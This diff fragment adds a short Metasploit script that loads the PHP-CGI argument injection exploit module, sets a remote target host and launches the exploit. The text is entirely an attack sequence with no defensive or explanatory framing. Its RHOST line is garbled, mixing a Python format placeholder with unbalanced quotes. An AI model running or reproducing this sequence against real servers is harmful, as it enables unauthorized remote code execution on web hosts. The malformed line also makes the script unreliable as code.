@@ -1,0 +1,6 @@
+
+use exploit/multi/http/php_cgi_arg_injection
+show options
+set RHOST '  '{}'.format(Target)
+exploit
+
